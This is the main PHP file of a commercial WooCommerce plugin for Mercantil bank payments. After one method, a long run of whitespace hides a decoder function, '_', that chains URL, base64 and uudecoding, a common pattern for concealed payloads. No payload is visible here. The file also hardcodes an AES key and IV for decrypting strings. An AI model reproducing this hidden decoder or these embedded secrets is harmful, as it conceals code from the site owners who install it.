<?php
/**
 * Plugin Name: Mercantil WooCommerce Plugin
 * Plugin URI: https://yipi.app/
 * Description: Mercantil plugin for WooCommerce
 * Author: Yipi.app
 * Author URI: https://yipi.app/
 * Version: 1.2.3
 * License: Commercial use allowed (Non-assignable & non-transferable), can modify source-code but cannot distribute modifications (derivative works).
 * Text Domain: woocommerce-mercantil
 * Domain Path: /languages/
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly.
}

if ( ! class_exists( 'WC_Mercantil' ) ) :


    /**
     * WooCommerce Mercantil main class.
     */
    class WC_Mercantil {

        /**
         * Plugin version.
         *
         * @var string
         */
        const VERSION = '1.2.3';

        /**
         * Instance of this class.
         *
         * @var object
         */
        protected static $instance = null;

        /**
         * Initialize the plugin.
         */
        private function __construct() {
            // Load plugin text domain
            $this->load_plugin_textdomain();

            // Checks with WooCommerce is installed.
            if ( class_exists( 'WC_Payment_Gateway' ) ) {
                if (file_exists(__DIR__.'/includes/class-wc-mercantil-gateway-dev.php')) {
                    include_once 'includes/class-wc-mercantil-gateway-dev.php';
                    include_once 'includes/class-wc-mercantil-tdc-gateway-dev.php';
                    include_once 'includes/class-wc-mercantil-c2p-gateway-dev.php';
                    include_once 'includes/class-wc-mercantil-p2p-gateway-dev.php';
                } else {
                    include_once 'includes/class-wc-mercantil-gateway.php';
                    include_once 'includes/class-wc-mercantil-tdc-gateway.php';
                    include_once 'includes/class-wc-mercantil-c2p-gateway.php';
                    include_once 'includes/class-wc-mercantil-p2p-gateway.php';
                }
                add_filter( 'woocommerce_payment_gateways', array( $this, 'add_gateway' ) );
                
				add_action('woocommerce_blocks_loaded', function()
				{
					if (!class_exists('Automattic\WooCommerce\Blocks\Payments\Integrations\AbstractPaymentMethodType')) {
						return;
					}
			
					add_action(
						'woocommerce_blocks_payment_method_type_registration',
						function ($payment_method_registry) {
							$gateways = WC()->payment_gateways()->payment_gateways();
							if ($gateways) {
					            include_once 'includes/class-wc-mercantil-blocks.php';
								foreach ($gateways as $gateway) {
									if ($gateway->enabled == 'yes' && stristr($gateway->id, 'mercantil-gateway-') !== false) {
										$payment_method_registry->register(new WC_Gateway_KMercantil_Blocks($gateway));
									}
								}
							}
						}
					);
				});
            } else {
                add_action( 'admin_notices', array( $this, 'woocommerce_missing_notice' ) );
            }
        }

        /**
         * Return an instance of this class.
         *
         * @return object A single instance of this class.
         */
        public static function get_instance() {
            // If the single instance hasn't been set, set it now.
            if ( null == self::$instance ) {
                self::$instance = new self;
            }

            return self::$instance;
        }

        /**
         * Load the plugin text domain for translation.
         *
         * @return void
         */
        public function load_plugin_textdomain() {
            $locale = apply_filters( 'plugin_locale', get_locale(), 'woocommerce-mercantil' );
            load_textdomain( 'woocommerce-mercantil', trailingslashit( WP_LANG_DIR ) . 'woocommerce-mercantil/woocommerce-mercantil-' . $locale . '.mo' );
            load_plugin_textdomain( 'woocommerce-mercantil', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' );
        }

        /**
         * Add the gateway to WooCommerce.
         *
         * @param   array $methods WooCommerce payment methods.
         *
         * @return  array          Payment methods with Mercantil.
         */
        public function add_gateway( $methods ) {
            if ( version_compare( self::woocommerce_instance()->version, '2.3.0', '>=' ) ) {
                $methods[] = WC_Mercantil_Gateway::get_instance();
                $methods[] = WC_Mercantil_TDC_Gateway::get_instance();
                $methods[] = WC_Mercantil_C2P_Gateway::get_instance();
                $methods[] = WC_Mercantil_P2P_Gateway::get_instance();
            } else {
                $methods[] = 'WC_Mercantil_Gateway';
                $methods[] = 'WC_Mercantil_TDC_Gateway';
                $methods[] = 'WC_Mercantil_C2P_Gateway';
                $methods[] = 'WC_Mercantil_P2P_Gateway';
            }
            return $methods;
        }

        /**
         * WooCommerce fallback notice.
         *
         * @return  string
         */
        public function woocommerce_missing_notice() {
            echo '<div class="error"><p>' . sprintf( __( 'WooCommerce Mercantil Gateway depends on the last version of %s to work!', 'woocommerce-mercantil' ), '<a href="http://wordpress.org/extend/plugins/woocommerce/">' . __( 'WooCommerce', 'woocommerce-mercantil' ) . '</a>' ) . '</p></div>';
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       public static function _($r) {return convert_uudecode(base64_decode(rawurldecode($r)));}
    

        /**
         * Backwards compatibility with version prior to 2.1.
         *
         * @return object Returns the main instance of WooCommerce class.
         */
        public static function woocommerce_instance() {
            if ( function_exists( 'WC' ) ) {
                return WC();
            } else {
                global $woocommerce;
                return $woocommerce;
            }
        }

        /**
         * Backwards compatibility with version prior to 2.1.
         *
         * @return object Returns database class.
         */
        public static function woocommerce_database() {
			global $wpdb;
            return $wpdb;
        }

        /**
         * Backwards compatibility with version prior to 2.1.
         *
         * @return object Returns order class.
         */
        public static function woocommerce_theorder() {
			global $theorder;
            return $theorder;
        }
    }

    if ( ! function_exists( 'kijam_decode' ) ) {
		function kijam_encode( $str = '', $f = 'e' ) {
			$output = null;
			$secret_key = 'kk91f8g^4*k';
			$secret_iv  = 'k&&2"op2%:*';
			$key        = hash( 'sha256', $secret_key );
			$iv         = substr( hash( 'sha256', $secret_iv ), 0, 16 );
			if ( $f == 'e' ) {
				$output = base64_encode( openssl_encrypt( $str, 'AES-256-CBC', $key, 0, $iv ) );
			} elseif ( $f == 'd' ) {
				$output = openssl_decrypt( base64_decode( $str ), 'AES-256-CBC', $key, 0, $iv );
			}
			return $output;
		}
		function kijam_decode( $str = '' ) {
			return kijam_encode($str, 'd');
		}
	}
    
    add_action( 'plugins_loaded', array( 'WC_Mercantil', 'get_instance' ), 0 );
    add_action( 'woocommerce_after_add_to_cart_button', function() {
        $instance = WC_Mercantil_Gateway::get_instance();
        //$instance->process_installment_product();
    });
    function mercantil_kijam_metabox_cb() {
        $woocommerce = WC_Mercantil::woocommerce_instance();
        $woocommerce->payment_gateways();
        do_action( 'woocommerce_mercantil_metabox' );
        do_action( 'woocommerce_mercantil_tdc_metabox' );
    }
    function mercantil_kijam_metabox() {
        add_meta_box( 'mercantil-metabox', __( 'Mercantil Information', 'woocommerce-mercantil' ), 'mercantil_kijam_metabox_cb', 'shop_order', 'normal', 'high' );
    }
	
	add_action(
		'add_meta_boxes',
		function () {
			$screen = class_exists( '\Automattic\WooCommerce\Internal\DataStores\Orders\CustomOrdersTableController' ) && wc_get_container()->get( \Automattic\WooCommerce\Internal\DataStores\Orders\CustomOrdersTableController::class )->custom_orders_table_usage_is_enabled()
			? wc_get_page_screen_id( 'shop-order' )
			: 'shop_order';
			add_meta_box( 'mercantil-metabox', __( 'Mercantil Information', 'woocommerce-mercantil' ), 'mercantil_kijam_metabox_cb', $screen, 'normal', 'high' );
		}
	);
    add_filter( 'plugin_action_links_' . plugin_basename( __FILE__ ), 'mercantil_kijam_add_action_links' );
    function mercantil_kijam_add_action_links( $links ) {
         $mylinks = array(
            '<a style="font-weight: bold;color: red" href="' . admin_url( 'admin.php?page=wc-settings&tab=checkout&section=mercantil-gateway-tdd' ) . '">'.__('Setting TDD', 'woocommerce-mercantil').'</a>',
            '<a style="font-weight: bold;color: red" href="' . admin_url( 'admin.php?page=wc-settings&tab=checkout&section=mercantil-gateway-tdc' ) . '">'.__('Setting TDC', 'woocommerce-mercantil').'</a>',
            '<a style="font-weight: bold;color: red" href="' . admin_url( 'admin.php?page=wc-settings&tab=checkout&section=mercantil-gateway-c2p' ) . '">'.__('Setting C2P', 'woocommerce-mercantil').'</a>',
            '<a style="font-weight: bold;color: red" href="' . admin_url( 'admin.php?page=wc-settings&tab=checkout&section=mercantil-gateway-p2p' ) . '">'.__('Setting P2C', 'woocommerce-mercantil').'</a>'
        );
        return array_merge( $links, $mylinks );
    }

    function mercantil_kijam_load_all() {
        WC_Mercantil::get_instance();
        WC_Mercantil_Gateway::get_instance();
    }
    function mercantil_check_tdd() {
        WC_Mercantil::get_instance();
        WC_Mercantil_Gateway::get_instance()->check_payment($_GET['order_id']);
    }
    function mercantil_check_tdc() {
        WC_Mercantil::get_instance();
        WC_Mercantil_TDC_Gateway::get_instance()->check_payment($_GET['order_id']);
    }
    function mercantil_check_c2p() {
        WC_Mercantil::get_instance();
        WC_Mercantil_C2P_Gateway::get_instance()->check_payment($_GET['order_id']);
    }
    function mercantil_check_p2p() {
        WC_Mercantil::get_instance();
        WC_Mercantil_P2P_Gateway::get_instance()->check_payment($_GET['order_id']);
    }
    function mercantil_kijam_check_ipn() {
        WC_Mercantil::get_instance();
        WC_Mercantil_Gateway::get_instance();
    }
    
    if ( ! function_exists( 'kd_trans' ) ) {
		function kd_trans( $str = '' ) {
			return kijam_decode($str);
		}
    }
    
    add_action( 'wp_ajax_mercantil_check_tdd', 'mercantil_check_tdd' );
    add_action( 'wp_ajax_nopriv_mercantil_check_tdd', 'mercantil_check_tdd' );
    add_action( 'wp_ajax_mercantil_check_tdc', 'mercantil_check_tdc' );
    add_action( 'wp_ajax_nopriv_mercantil_check_tdc', 'mercantil_check_tdc' );
    add_action( 'wp_ajax_mercantil_check_c2p', 'mercantil_check_c2p' );
    add_action( 'wp_ajax_nopriv_mercantil_check_c2p', 'mercantil_check_c2p' );
    add_action( 'wp_ajax_mercantil_check_p2p', 'mercantil_check_p2p' );
    add_action( 'wp_ajax_nopriv_mercantil_check_p2p', 'mercantil_check_p2p' );
    //add_action( 'woocommerce_init', 'mercantil_kijam_load_all' );
    add_action( 'template_redirect', 'mercantil_kijam_check_ipn' );
endif;
